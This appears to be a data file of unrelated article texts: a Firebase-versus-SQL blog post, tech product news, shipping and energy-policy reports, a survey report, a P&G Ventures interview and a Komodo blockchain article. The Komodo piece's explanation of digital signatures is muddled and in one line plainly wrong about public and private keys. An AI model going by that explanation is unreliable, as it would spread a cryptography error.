startup in a box. \nFirebase teaches front-end devs to use a distributed architecture \nFirebase enables a distributed architecture. \nNew developers have traditionally learned to build monolithic apps. \nA monolith is a single application server that holds your database and server. Everything lives on a single server that you control, so it's very easy to teach and understand. \nThe first managed service that I used was Amazon S3. It was an endpoint where I could send files. S3 would save the files and give me a link. I'd save the link in my local SQL database and S3 would serve the file to my users. \nManaged services are used to create distributed systems. Each part of the system is optimized for a small part of the puzzle. Developers compose these systems together. \nAWS and GCP provide extremely powerful, complicated managed services aimed at large, enterprise users. They're not built for indie devs. And that's where Firebase comes in. \nFirebase lets you quickly deploy managed services for small- to medium-sized apps. And you can roll in heavier-duty Google Cloud Platform (GCP) services as your app grows. \nAn Alternative to SQL \nMost developers are raised on SQL. \nSQL is great for modeling relational data, but guess what! Most data is not as relational as you may think. \nSQL is ideal when you don't know how you're going to query your data. You simply store your data in third normal form and SQL lets you query it into almost any structure for your front end. \nFirebase and other NoSQL datastores optimize for reads, which are much more common than writes. So instead of writing once and reading in many different ways like with SQL... NoSQL/Firebase asks you to write the data to match your reads. \nFirebase crushes other databases (for many use cases) \nLet's say that I have new user sign up for a multi-player RPG. I want to show that user's email address on their profile, next to any messages that they send to other users. Finally, I'll need a list of all user emails for my admin dashboard. \nFirebase asks you to write that email address in three different places, one for each type of read operation. \"But Chris!\" you ask. What if I need to change the email address??? Isn't that inefficient??? \nYep. It's inefficient. You'll have to update that email address in three places, and you'll have to be careful to track everywhere that you saved it. \nBut how often do you actually need to write an email address? What about the reads??? \nThe reality, and the reason that Firebase works so well, is that most apps read data significantly more than they write it. \nSo get over your SQL-induced anxiety and duplicate data throughout your Firebase data structure. Your database reads will dramatically outperform SQL reads at scale. \nThe Evil Twin Databases \nFirebase now has two databases, \nthe Realtime Database , also known as classic Firebase or the RTDB, and \nCloud Firestore . \nThe Realtime Database is ideal for fast, high-volume operations. I use the RTDB for tracking how many users I have online at any one time. I use it for job queues that are consumed with Cloud Functions . \nFirestore is better for longer-lived, more structured data. I use Firestore for 90% of my data storage. You pay by the operation, so it's not ideal for extremely frequent reads and writes... but that's why we have the RTDB :) \nI use Firestore for user profiles, chat logs, purchase records... anything that I need to stick around for a while. \nFirebase is cheap and much, much faster \nThe Iron Triangle of Project Management states that all projects are compromises between cost , scope and time . \nFirebase is the lowest-cost and fastest development experience of which I'm aware. The free plan will get you very far and when you outgrow that, the $25 plan has good amounts of space for your app. \nI bootstrap projects on a regular basis. Most of my projects are solo projects. I'm the developer, designer and marketer. I'm incredibly time-constrained, so I use Firebase to enable me to achieve greater scope while keeping my time costs low. \nI've built the following projects entirely on my own with Firebase: \ncalligraphy.org : Online teaching platform integrated with Shopify \nHiiTClock.com : PWA workout timer \npixels.chrisesplin.com : Chrome extension for UI development \nbunches.chrisesplin.com : Multi-player card game \nCalligraphy.org powers my wife's business. It took me four months to write it in the mornings before my full-time job. It would have taken twice as long without Firebase. \nThe other projects took between 75 and 200 hours each. Again, I finished them in my spare time while relying heavily on Firebase. \nFirebase has spoiled me. I've used Firebase instead of SQL since 2013. And these aren't just rapid prototypes. They're fully-functional, scalable and used by thousands of customers. \nFirebase includes nearly everything I need to build small- to medium-sized apps \nThe pillars of Firebase's web offering are \nthe Realtime Database (json database), \nCloud Firestore (document/collection database), \nCloud Functions for Firebase (serverless functions), \nFirebase Storage (file/blob storage), and \nFirebase Hosting (static file hosting). \nThese five pillars can support an enormous range of apps. \nRealistically, you'll need to \"cheat\" on Firebase a bit for larger apps. I use GCP for a few things that don't fit neatly within the Firebase offering. I also use Algolia to power my search. \nThe funny thing is that Algolia is the most expensive part of my stack at $35/month. The Firebase databases are optimized for everything except search . This is an important caveat to recognize early. Searching Firestore collections or anything in the Realtime Database is extremely limited, and for strong architectural reasons. I don't expect to ever see Firebase support search. \nI primarily use GCP to manage the DNS for my domains. And I sometimes run Cloud Compute instances for small, custom tasks. \nI also use GitLab.com for CI/CD purposes... so I guess I step out on Firebase a couple of times on each project :) \nFirebase scales effortlessly \nFirebase does not allow slow operations. The database does not execute joins. It doesn't search. \nI haven't personally built a Firebase app up to massive scale. I've heard that the Realtime Database can run into limits and require manual sharding; however, Firestore is architected much differently, and I wouldn't be surprised if it scales more like Cloud Spanner . \nFirestore has some awesome performance characteristics. \nAll queries scale with the size of your result set (note: not your data set), so your app is ready to scale from day one. \nFirestore also offers strong consistency, meaning that you don't have to worry about the eventual-consistency data models that bedevil most NoSQL implementations. \nGCP is the escape hatch \nFirebase services are built on Google Cloud Platform (aka GCP) infrastructure, and some of them are closely integrated. \nFor instance, Firebase Cloud Storage uses GCP Storage buckets that you can access through the GCP SDKs. \nGCP is an enterprise-focused suite of services. It's massive. \nEach Firebase project comes with its own GCP account, granting you access to the full power of GCP. So don't worry if Firebase doesn't fulfill your every need. GCP has it covered. \nFor example, If you don't want to pay for Algolia, you can spin up an Elasticsearch cluster on GCP and roll your own search. It'll be just as expensive as Algolia... so I can't recommend it for small projects; however, those capabilities are all there. \nCommon concerns with Firebase \nFirebase has it's downsides! \nFirebase cannot be hosted locally. \nFirebase is tough to mock for local unit tests. \nThere's far less tooling available than for SQL databases. \nFirebase can get expensive if you implement it poorly. \nNone of these problems bothers me. It may be Stockholm Syndrome... but I'm at peace with all of these \"problems\" with Firebase. \nEngineering is all about tradeoffs. Firebase trades a bunch of control and autonomy for speed and simplicity of development. \nWhen to NOT use Firebase \nDO NOT use Firebase for highly relational data. \nDO NOT use Firebase for complex graph data. \nDO NOT use Firebase for complex server needs. \nI sometimes recommend hybrid architectures. Store your relational data in GCP's Cloud SQL or Cloud Spanner databases. Store your graph data in JanusGraph on top of Cloud Bigtable. \nBut these are all advanced use cases! Don't worry about them until you need them. \nThe competition \nFirebase's direct competition is dead. Facebook killed off Parse and RethinkDB suffered a similar fate. \nThe most direct alternative to Firebase at this point is AWS or GCP. They're much more complicated and harder to use... but you could achieve similar architectures with other services. \nOr just use Postgres. Postgres is killer... as long as you have budget to write your own API on top of it. \nThat's about it. Use AWS, GCP or Postgres. Your dev velocity will suffer, but at least with Postgres you can run everything locally! \nI've worked in a corporate setting with Postgres running in a local Docker container, and it's slick. I didn't write that API myself. It was expensive to maintain, and I could have duplicated it in Firebase at a much lower cost. But the business I was working with wasn't a fan of managed services. What could I do :) \nConclusion: Firebase is preferred for most front-end-focused apps \nFirebase is a slam dunk for small- to medium-sized projects, especially if they're front-end focused. \nYou may need to re-architect if you hit massive scale... but you always have to re-architect for massive scale. Don't prematurely optimize for scale. \nChoose Firebase because it gets you to market faster. It helps you validate your ideas and get feedback. \nFirebase is a cornerstone of Google's cloud strategy. It's not going anywhere.",

Although, its September release date is a little late for places with distinct seasons, where the summer will soon make way for the fall. Those in the southern hemisphere will have a chance to take the Bose Portable Home Speaker out and about soon, though. \nThe Bose Portable Home Speaker comes with Google Assistant and Amazon's Alexa, and it costs more than some regular smart speakers, although it's pretty typical of Bose devices to come with higher price tags. The Portable Home Speaker has a battery that can last up to 12 hours, according to the company. Most smart speakers from Google and Amazon aren't portable or battery-powered, apart from Amazon's own Echo Tap speaker which isn't available on Amazon anymore. \nOverall, the Bose Portable Home Speaker could be the last and only speaker you'll ever need. It's a smart speaker with Google Assistant or Alexa for home and it's portable and battery-powered when you want to take it out. And seeing as its a Bose speaker, the sound quality is likely going to be good enough for both indoors and outdoors. \nCheck out the new $350 Bose Portable Home Speaker: \nThe new Bose Portable Home Speaker can be battery powered for up to 12 hours, connects to devices via Bluetooth, and can play music from Spotify or Apple devices over WiFi. \nHoused within the Bose Portable Home Speaker are Google Assistant and Amazon's Alexa smart assistant, which are ready to accept voice commands. \nIt's resistant to splashes, projects sound in 360 degrees, comes with a handle, weighs 2.3 pounds, and is made of aluminum. \nThe Bose Portable Home Speaker costs $350 and will be available in September.",

It\u2019ll feature all 10 LCK teams, while also bringing in eight teams from Challengers Korea and its promotional qualifiers. \nLast year, the KeSPA Cup was broadcast in English for many excited LCK fans. This tournament was the first chance for people to see the newest LCK rosters in action, especially after a busy 2018 offseason. This year could have been more of the same since so many big-name players changed teams, but now English-speaking viewers won\u2019t get the same experience. \n\u201c[The] LCK literally has to do nothing to keep its grip on the Western audience,\u201d ESPN reporter Tyler \u201cFionnonFire\u201d Erzberger said . \u201c[The] LPL is the better league, but Western fans still follow the LCK and its teams like they\u2019re the top dogs. What a slap in the face.\u201d \nThere are a few people who still want an English broadcast, however. T1 CEO Joe Marsh, for example, said that both his team and Gen.G agreed to share the cost of English casters for the KeSPA Cup if it meant the broadcast was allowed once more. \nThe 2019 KeSPA Cup begins on Monday, Dec. 23.",

      "text": "2019 saw the weakest start to the dry bulk market in years, and especially the trade conflict between the US and China, a mining accident in Brazil and China's coal restrictions were the big villains, reports bulk operator Pacific Basin in a quarterly update . \nThe update from the Hong Kong-based shipping company marks the first time that a leading carrier presents figures for early 2019, which has already created many stories on, for instance, the Baltic Dry Index, which in this year alone is down close to 50 percent. \n\"The dry bulk freight market in 2019 has started weaker than the last two years with a more pronounced Chinese New Year dip compounded by the US-China trade conflict, Chinese restrictions on coal imports and iron ore infrastructure disruptions in Brazil. This led to weak spot market rates in the first quarter overall,\" writes Pacific Basin in the update. \nThe company does not publish any actual accounting figures in the update. Instead, Pacific Basin informs that average time charter rates for its handysize and supramax vessels were USD 9,080 and USD 10,400 per day in the first quarter, respectively. This is 3 and 8 percent higher than the same period last year. \nPositive trends in the second half \nAnd though the year has started out weaker than usually, there were traces of uplifting trends in the second half of the quarter, says Pacific Basin. \n\"Our handysize and supramax markets improved significantly during the second half of the quarter ... In contrast, the larger capesize vessel segment has seen little recovery and continued to weaken throughout the first quarter,\" writes Pacific Basin, adding that various key factors will entail the bulk market becoming more volatile for the rest of the year than it has been for the past years. \nStill, Pacific Basin says that the dry bulk market looks positive in the long term. \n\"Despite short term volatility and in view of the combination of continued healthy growth in minor bulk demand and reducing handysize and supramax fleet growth, we continue to believe that the longer term fundamentals for our vessel segments are positive,\" the company writes. \nTook delivery of three newbuilds \nIn the first quarter, Pacific Basin had three new vessels delivered, one handysize and two supramax, which were bought last year, while the company sold an older handysize vessel. \nPacific Basin has also committed to buying additional three second-hand supramax vessels, bringing the carrier's fleet to 115 owned vessels. \n\"We will continue to buy second-hand ships, not newbuildings. We think there is still upside in second-hand values, and we will continue to grow. More so on the supramax side, but we will also buy handysize ships,\" said Pacific Basin CEO Mats Berglund in an interview with ShippingWatch a few weeks ago. \nIn the first quarter, the company had a fleet of 220 vessels, including chartered ships. \nEnglish Edit: Jonas Sahl J\u00f8rgensen",

      "text": "Have you ever written an email but didn't want to send it immediately? \nI don't know about you, but this is a normal occurrence for me. I've created email drafts and let them sit in my Drafts folder in Gmail, patiently waiting to send them so they reach my contacts' inboxes at just the right moment. \nDoes this sound like you too? \nWell, if not, here are a few more reasons you might want to delay sending an email. \nYou want the email to arrive in your prospect's inbox at the best time for them. \nThe person you're emailing lives in a different time zone. \nYou're working late and you want the email to arrive in the morning. \nNo matter the reason, having the flexibility to schedule emails so they send at the ideal time is a luxury, especially since email providers, like Gmail, lack this functionality. This is where the HubSpot Sales saves the day. \nThis free email scheduling tool allows you to schedule emails to send later in Gmail. Plus, you can preview or cancel the email before it sends if you need to make any last-minute changes. Sales automation like this can speed up your email sending processes, make you more efficient, and free up your time. \nSo, how can this tool work for you exactly? \nHow to Schedule an Email to Send Later in Gmail \nAdd the HubSpot Sales Google Chrome extension. \nOpen up Gmail. \nConnect your inbox. \nClick the Compose button. \nClick the clock icon. \nClick the Schedule button. \n1. Add the HubSpot Sales Google Chrome extension. \nNavigate to the chrome web store and click the Add to Chrome button. You'll be prompted to log in. \n2. Open up Gmail. \nOnce you're logged in, open up your Gmail inbox. You should see a HubSpot icon in the top, right-hand corner of the inbox. Click the icon and click the Turn on button. \n3. Connect your inbox. \nClick the Connect inbox button and follow the on-screen instructions. With the HubSpot tools turned on, now, you're ready to start writing and scheduling emails. \n4. Click the Compose button. \nCreate a new email by clicking the Compose button. This will create a brand new email draft for you to work with. \nNext, fill out the email details: To, Subject, and the content of your email. (If you're reaching out to a prospecting email, check out these prospecting email templates for inspiration.) \n5. Click the clock icon. \nClick the clock icon next to the Send button and select one of the following options: \nTomorrow : This allows you to send the email tomorrow. Click the dropdown menu to select the recipient's timezone. \nCustom : Choose a specific date and time for your email to send. \nBest time to send or Best time to send this week : These \"best time to send\" features are available with Sales Hub Professional or Enterprise only. The tool suggests times to schedule your email so it will have a higher likelihood of opens, clicks, and replies based on the recipient's prior email engagement. \n6. Click the Schedule button. \nOnce you've selected a time to send your post, click the orange Schedule button. \nOnce the email is scheduled, it will appear in the Scheduled Mail folder. \nWhen you click on the folder, you'll be brought to a Scheduled emails outbox where you can see all your scheduled emails. From this page, you can either preview your email or delete it. \nIf the email preview looks good to go, your email is all set to send out at your desired time. \nBy scheduling emails, you'll ensure that your message makes it to the top of your prospects' inboxes and reaching them at times it's convenient for them.

      "text": "Support for lesbian, gay, bisexual and transgender rights has increased or remained steady among Mormons, Muslims, political independents, southerners, seniors and a number of other demographic groups in the United States since 2015, a new survey found. One notable outlier: young Republicans. \nBetween 2015 and 2018, support for laws aimed at protecting L.G.B.T. individuals from discrimination fell by nearly 10 percentage points among Republicans under the age of 30. This was one of the key findings from a survey of more than 40,000 Americans\u2019 views on L.G.B.T. issues that the Public Religion Research Institute released Tuesday. \nThe majority of young Republicans surveyed \u2014 around 63 percent \u2014 continued to support such measures. But given that 74 percent were in favor in 2015, the shift was striking, said Robert P. Jones, the C.E.O. of the institute, a Washington-based nonpartisan nonprofit. \n\u201cIt was one of the largest and most significant drops that we saw,\u201d said Dr. Jones. \nUnderstanding this shift would require additional study, he said, but one hypothesis he offered was that the ranks of young Republicans are thinning, with more socially liberal individuals opting to identify as independent. \u201cThe Republican Party is becoming more ideologically pure,\u201d he suggested. \nHere are three other findings from the survey: \nAsian-Pacific Islander Americans Lead in Support of Gay Marriage \nSixty-two percent of Americans continue to support same-sex marriage, the survey found. But among all racial and ethnic groups surveyed, individuals identifying as Asian-Pacific Islander Americans demonstrated the highest level of support for both same-sex marriage (75 percent) and for laws that would protect L.G.B.T. people from discrimination in jobs, public accommodations and housing (73 percent, four percentage points more than Americans overall). \nThese figures could be partly explained by another finding: researchers spotted a strong correlation between participants\u2019 educational level and support of L.G.B.T. rights. Overall, Asian-Pacific Islander Americans were far more likely than other Americans surveyed to hold either a four-year college degree or a postgraduate degree, Dr. Jones said. \nMembers of Most Religious Groups Support Anti-Discrimination Protections \nBreaking survey responses down by participants\u2019 faith, analysts found majority support for anti-discrimination measures for L.G.B.T. people from every major religious group. The strongest support came from Unitarian Universalists (90 percent), Jews (80 percent) and Hindus (79 percent). Seventy percent of Mormons, 60 percent of Muslims and 54 percent of white evangelical Protestants were also in favor. \nResearchers had also found widespread support among religious groups in 2015 and 2017. (The 2016 survey did not investigate this matter.) \n\u201cWhat\u2019s remarkable, I think, is how consistent these numbers are,\u201d Dr. Jones said. \u201cWhen you think of our polarized political environment, there are very few issues that you can say there\u2019s bipartisan, cross-religious support for. This is an issue you can say that on.\u201d \nThe survey also examined support for small businesses\u2019 ability to refuse service based on the owners\u2019 religious beliefs. Researchers identified a sharp split between men and women on this topic. Nearly half of men and less than 40 percent of women surveyed supported refusals of service on religious grounds. \nSeattle Had the Highest Percentage of L.G.B.T. People \nThe survey was conducted by calling 1,000 randomly selected individuals every week. A significant percentage of those people lived in 35 major metro areas. \nThough there have been other methods used to identify the cities in America with high percentages of L.G.B.T. people, the survey data also offered indications. With 10 percent of survey participants identifying as L.G.B.T., Seattle took first place. Portland, Ore., and Austin, Tex., were tied for second, with 9 percent each. \nOverall, about 5 percent of the 40,000 people surveyed identified as L.G.B.T., which was consistent with previous years, according to Dr. Jones.",

      "text": "If you thought Logitech's G603 Lightspeed was light on thumb controls compared to its G602 predecessor, you can relax -- you'll be drowning in them this time around. The company has introduced a G604 Lightspeed mouse that packs six thumb buttons like the years-old G602 while offering modern creature comforts like a 16,000DPI HERO sensor, Bluetooth support and, of course, no-lag Lightspeed wireless. It's pitched as ideal for playing World of Warcraft Classic and other titles where you might have an abundance of commands that beg for faster access. \nYou can expect a total of 15 customizable controls, a dual-mode scroll wheel and, as is more common with Logitech's mice these days, plenty of battery life. You'll get ten days' worth of battery using Lightspeed (shorter than the 21 days of the G603, but it's more complex), but a whopping 5.5 months on Bluetooth -- and both need only one AA battery. \nThe G604 arrives later in the fall for $100. That's decidedly more expensive than the $70 G603, but it's evident Logitech sees this more as a step up than a straightforward replacement. \nSource: Logitech",

      "text": "Former U.S. Ambassadors Say Nord Stream 2 Sanctions Bill Pits U.S. Against Germany [GGP] \nTwo former U.S. ambassadors criticized legislation that seeks to impose sanctions on companies building Russia\u2019s $11-billion gas pipeline to Germany, saying it could harm relations between the two NATO countries. \nRather, they said the United States should threaten to sanction Russia if it reduces natural gas transit through Ukraine below a certain level. \nCongress is seeking to sanction the vessels that are laying the Nord Stream 2 pipeline along the floor of the Baltic Sea in an attempt to halt the project, which U.S. lawmakers say will make Europe more dependent on Russian energy. \nThe pipeline will have the capacity to carry 55 billion cubic meters of natural gas annually to Germany, doubling the nation\u2019s imports of Russian gas, while avoiding transit through Ukraine and Poland. \nThe project is weeks away from completion, but President Donald Trump is expected to sign the annual defense spending bill that contains the Nord Stream sanctions legislation on December 20. Swiss-based Allseas Group and its vessels are the primary targets. \nFormer Ambassador Daniel Fried, who crafted the State Department\u2019s sanctions policy against Russia in 2014 after it annexed Crimea, said December 19 at an Atlantic Council conference in Washington that the Nord Stream 2 sanctions legislation \u201cpits the U.S. against Germany\u201d rather than against the Kremlin. \nFried said he thought the Germans were \u201cwrong\u201d for agreeing to Nord Stream 2, but \u201cthat doesn\u2019t mean that the Germans are the problem. The Kremlin is the problem. It is their aggression and their use of energy as a coercive tool\u201d that is a problem. \nThe aim of the Nord Stream sanctions is to ensure that Russian gas continues to flow through Ukraine and Central Europe by delaying its completion. \nRussia\u2019s launch of Nord Stream 2 and Turkstream, which runs under the Black Sea to Turkey, would enable the Kremlin to avoid transit through Ukraine, depriving the country of as much as $3 billion in fees. \nHowever, some analysts and officials have said that even if sanctions are put in place, it would only be a matter of time before Russia would finish Nord Stream 2 on its own, leaving the United States with no leverage over transit. \nFried along with former Ambassador Richard Morningstar, who served as the Secretary of State\u2019s special envoy for Eurasian energy during the Obama administration, suggested using the uncertainty over Nord Stream 2 sanctions to reach a deal with Germany and the European Union on other measures. \nFried and Morningstar suggested the United States could impose sanctions on Russia\u2019s state-owned gas giant Gazprom -- such as on its debt, equity, and technology needs -- should Russian gas transit through Ukraine fall below a certain level. \nRussia\u2019s gas transit contract with Ukraine expires on January 1. The two sides said December 19 that they have reached an agreement in principle on a new transit contract though few details were given. Ukraine had been pushing for a long-term contract while Russia was seeking a one-year contract. \n\u201cIf this [uncertainty] could drive us toward some kind of deal -- possibly with contingency sanctions -- that could be the most helpful outcome,\u201d Morningstar said. \nFried said Washington will \u201chave failed\u201d if the story ends up being a U.S.-German fight over Russia policy. \n\u201cThat is a bad outcome and I am eager to avoid it,\u201d he said. \nRFE/RL. \nThe statements, opinions and data contained in the content published in Global Gas Perspectives are solely those of the individual authors and contributors and not of the publisher and the editor(s) of Natural Gas World",

      "text": "Neural networks for image recognition have evolved through extensive manual design from simple chain-like models to structures with multiple wiring paths. The success of ResNets and DenseNets is due in large part to their innovative wiring plans. Now, neural architecture search (NAS) studies are exploring the joint optimization of wiring and operation types, however, the space of possible wirings is constrained and still driven by manual design despite being searched. In this paper, we explore a more diverse set of connectivity patterns through the lens of randomly wired neural networks. To do this, we first define the concept of a stochastic network generator that encapsulates the entire network generation process. Encapsulation provides a unified view of NAS and randomly wired networks. Then, we use three classical random graph models to generate randomly wired graphs for networks. The results are surprising: several variants of these random generators yield network instances that have competitive accuracy on the ImageNet benchmark. These results suggest that new efforts focusing on designing better network generators may lead to new breakthroughs by exploring less constrained search spaces with more room for novel design.",

      "title": "Big Firms Can't Innovate: How P&G Ventures Is Dispelling The Myth",
      "text": "P&G Ventures \nProcter & Gamble \nLast year, I conducted an interview with CEO, Dave Morgan , who essentially suggested that the large CPG companies would struggle in a non-distribution constrained environment (i.e., Direct to Consumer). He had a provocative view. In response, I recently talked to Leigh Radford, Vice President and General Manager who heads a newer division at Procter and Gamble called P&G Ventures. Below is insight into how P&G is blending the best of big and small firms to create new, innovative business models, products and solutions for consumers. \nKimberly Whitler: What is P&G Ventures? \nLeigh Radford : P&G Ventures is a startup studio designed to fuel P&G growth by creating brands and businesses to solve consumer problems in categories where P&G does not currently exist. Working internally and externally, with experts, innovators and entrepreneurs from around the world, we identify and develop technologies and business models in a fast-learning, startup-like, lean environment. We are developing a portfolio of startups focused on creating new brands and businesses in new categories to the company or to the world. \nWhitler: P&G has been creating new products for over a century. At one point, I saw that the company had created 23 $1 billion brands, more than any other company in the world. First, is this true? And second, if so, why did you create P&G Ventures? \nRadford : Yes, P&G has had a 180-year plus track record of being able to innovate and develop brands that become global successes. The story behind P&G Ventures shows not just how the company thinks about business management, but also about development of its people. About 3.5 years ago, P&G\u2019s CEO at that time, A.G. Lafley, developed the idea after coming back for his second stint as CEO. Over the years, he would mentor me and talk to me about his vision for my career. One day, he came up and said \u201cI want you to look at a couple of businesses. What would you do with them? How would you think about them?\u201d After I reviewed the new businesses and had a discussion with him, he said that he wanted me to do \u201cthis\u201d full-time\u2014to essentially review and develop smaller businesses that might not meet our hurdle rates yet. Essentially to begin to incubate promising new businesses and new categories for the company. At the time, I wasn\u2019t sure that it was what I wanted to do. When you typically think about corporate innovation centers, they are the \u201cgo to\u201d places in the company. The challenge at P&G is that that hasn\u2019t been the case. Most people come to P&G to run big businesses, billion-dollar businesses. Historically at P&G, the major innovation sat in the current business units. So if you develop a new brand or innovation outside of the business units, there becomes all sorts of challenges. P&G\u2019s leadership really believed in the idea and A.G. said, \u201cthe company needs this, and this is good for you.\u201d In true P&G leadership fashion, A.G. put me on the hot seat by asking \u201cwhat needed to be true\u201d for this to work. \nI thought about it and indicated I had four key requirements that would be important to get the business going: 1) needed to recruit top talent (I needed to be able to pick and retain top talent for at least a 3.5 year period before they rotated off the business), 2) the position needed to report into the CEO and have full-line of sight to the board (sometimes corporate innovation is fleeting and this often happens if it doesn\u2019t have appropriate sponsorship), 3) it needed to be highly visible so that it showed the company that we were committed, so I asked for a GO-based (headquarter) innovation center (now located on the 11th floor next to the executive suite), and 4) we needed the flexibility to stay out of the cross hairs of the businesses. \nA.G. agreed that this made sense and so the P&G Ventures group was born. I have my own budget and a different mandate. The disruption of DTC was biting on our heels. How consumers are discovering new brands is different than how we grew up. This gives us a more nimble, agile way to get closer to the consumer. We are building a studio within P&G that is initially launching brands in DTC. \nP&G Ventures \nProcter & Gamble \nWhitler: People assume that big companies like P&G are slow. How do you create a startup-like, lean environment within a large company? \nRadford : First, we have a flat organization. Our group is very senior and very lean. I needed people who had enough business experience to be able to make decisions with little oversight. I also needed a senior group who would have the confidence and skills to take smart risks. I don\u2019t have any Assistant Brand Managers in the group\u2014all more senior. On top of it, the team is outside facing, doing deals, and needed to be independent. \nSecond, we augmented our internal experience with needed skills from outside. Everything we are working on is DTC \u2013 digitally, native brands. The people with these skills are not necessarily senior folks from P&G, or frankly, senior folks from any company. We use a lot of external expertise to supplement our internal group. Also, we are now able to find Brand Managers within P&G who ran DTC businesses before coming to P&G. \nThird, because we are lean, we tend to make much faster decisions than you\u2019d think for a large company. We do the appropriate level of due diligence, but the experience of the team enables faster assessment and decision making. \nWhitler : How big is your portfolio right now? \nRadford : We have between 13-20 projects in our portfolio, and a lot more seedlings. The exact number is in constant flux. Every day we get data that supports passing on businesses we are evaluating, and we are in constant conversations with partners creating new businesses to be tested. \nWhitler : What products and projects are you working on that you are excited about now? \nRadford : As one example, Opt\u00e9 Precision Skincare which we debuted at CES in January. We have talked a lot about how we are partnering externally, but when we started P&G Ventures we shopped internally too to look for businesses and technologies that just didn\u2019t fit within the business unit where they were developed. Opt\u00e9 is one of these finds. It\u2019s an internally created technology that was developed over 10 years and has filed already over 40 patents. It is truly a technology breakthrough. Opt\u00e9 combines the best of optics, proprietary algorithms, printing technology and skincare in one device. It scans, detects and instantly visibly corrects skin tone. What we found is that women and men want to look as good as they feel, and skin tone is one of the primary factors on how we judge age, health, youthfulness and attractiveness. But current solutions to cover skin spots have trade-offs and really don\u2019t solve the need. Opt\u00e9 precisely only covers the visibility of spots so the natural radiance of your skin can be revealed. Opt\u00e9 delivers true transformation. \nWhitler : How are you marketing it? \nRadford : This is an example of how differently we are approaching the business. We wanted to establish Opt\u00e9 as high tech and get into the conversation so we shared the technology at CES a full year before it will be available for sale. We are currently are exploring several go-to-market models and pricing options all which will have a direct-to-consumer element. It\u2019s about learning early and learning fast. That means not having everything buttoned up. \nSo this provides an example of one of our new launch models. We are going small, pivoting, learning, reapplying. It\u2019s a very different journey. Traditionally, you\u2019d have a call center managing customer comments. Not on this business. We have all levels of leaders and functions doing the early phase of customer care. The team in charge of the startup business actually take turns taking the customer calls. This is about hearing and learning from consumers. Additionally, most of the product design and brand creative is done in-house. This is about being hands on, fast, nimble, and fluid. \nWhitler : You suggested earlier that P&G isn\u2019t good at the DTC model. How are you learning and growing in a way that benefits P&G? \nRadford : This is important. One thing we are really clear about is what we are good at and what we aren\u2019t. We are good at creating and scaling brands. We aren\u2019t as good at building a DTC business. We just don\u2019t have a lot of experience in DTC. Until that skill grows, I\u2019m actively out looking externally for CEOs to spin those companies out. We haven\u2019t finalized what the exact business relationships would be, but we believe it is a unique way to continue to grow the businesses we are developing and learn. \nTo help us learn in this startup-like ecosystem I created an advisory board. I brought onto the board really smart and experienced people like the CEO of Madison Reed and the former CEO of Match and current CEO of ShopRunner, among others, who are Silicon Valley founders and entrepreneurs. We also invested heavily in capability training. We brought in General Assembly, a training company that teaches practical technology skills like data analytics and SEO training so that we could continue to learn and have the skills to be more hands on. We also did an assessment of P&G Ventures' leadership team and identified ways to upskill their talents and took seven people to the Executive Digital Marketing class at Wharton. Lastly, I have been really surprised to find the generosity that exists in the startup world. It\u2019s a lonely world because it\u2019s hard. They all help each other. I will set up a meeting with one person and then they introduce me to four more people. It is exponential. That is the new business ecosystem. The generosity is crazy. \nWhile Dave Morgan indicated that P&G was being challenged by DTC brands, P&G Ventures appears to be addressing this by creating a division designed to both drive innovation and thrive in the DTC space. Perhaps this nearly 200-year-old company is more agile than some think. \nJoin the Discussion: @KimWhitler",

      "text": "On the 29 th of March, Komodo , which is an open-source \u201cinfrastructure for an interoperable blockchain ecosystem\u201d announced the incorporation of Dilithium, a very secure digital signature scheme. The Dilithium technology will guarantee protection from the heaviest of attacks, even from quantum computers . The Dilithium solution is now currently available for all platforms and projects that are produced based on the Komodo infrastructure. \nKomodo Integrates Dilithium: A Quantum-Secure Digital Signature Scheme https://t.co/lFEGUQeXOi #fintech #QuantumComputing #QuantumMechanics #blockchain #crypto #komodo #bitcoin #cryptocurrency #CryptoNews pic.twitter.com/StAv8SlcC1 \n\u2014 Komodo (@KomodoPlatform) March 29, 2019 \nNew Features Made Possible By Dilithium \nDilithium makes it possible for users to generate a quantum-secure address. Users who are signing up for this are first expected to create a handle of choice during the course of registration. Creating this handle registers as a blockchain transaction , combining the quantum-secure address and this newly chosen handle. The handle may then be used to send and receive funds instead of the regular addresses that have a long list of characters filled with arbitrary numbers and letters. \nAnother key feature with the Dilithium module is on its security. Using Dilithium necessitates that transactions must always be signed twice. The first signature is to satisfy the initial digital signature requirements of the original blockchain. The second is entire to satisfy the security processes of Dilithium\u2019s new process for protection against quantum attacks . This is a general way to make sure that transactions were extremely secure against attacks in whatever form they come. \nDilithium was created using the Komodo infrastructure and so it is available for any framework or project created based on Komodo . It is also very easy to integrate, as easy as using a plug-in. \nAbout Digital Signatures \nA digital signature is a code that sort of verifies the security of a transaction or document, showing that it has not been altered or compromised in any way. It is basically used to verify authenticity. \nDigital Signatures use public key cryptography which essentially creates both a private and a public key. The former is used to generate the latter which can then be given out as it cannot be used to figure out the public key. Basically, a public key can be used to encode data in such a way that it can only be decoded with the matching private key. \nThis system is used so that when a receiver does receive a message, they can easily confirm that at no point was the data compromised in transit. \nAbout Quantum Computing And The Threat, It Poses \nDigital signatures are normally very secure but overtime, researchers and experts have been able to notice certain susceptibilities that it has. However, even though it is generally possible to breach a digital signature based on some of these vulnerabilities, it is also extremely difficult and this is where quantum computing comes in. \nIt is thought that quantum computing will make many of currently used security measures, almost completely redundant. Most computers used binary digits to process information. These binary digits are stated are either 0 or 1 and could be a combination of these. Quantum computing, however, makes use of qubits which are essentially both 0 and 1 at the same time. This essential nature of qubits makes it very easy to circumvent binary computing. Quantum computing has not been completely produced yet but many developers are presently working on it. \nIt is predicted that quantum computing will eventually come into play sometime within the next decade and when it does, current cryptography process will be seriously threatened. This is why many researches including the Lead Developer at Komodo \u2013James \u2018jl777\u2019 Lee \u2013 are working on many different security measures like Dilithium. \nDilithium puts Komodo ahead of many in terms of blockchain security and it\u2019s hoped that more procedures, maybe even more secure than Dilithium, would be available in the near future.",

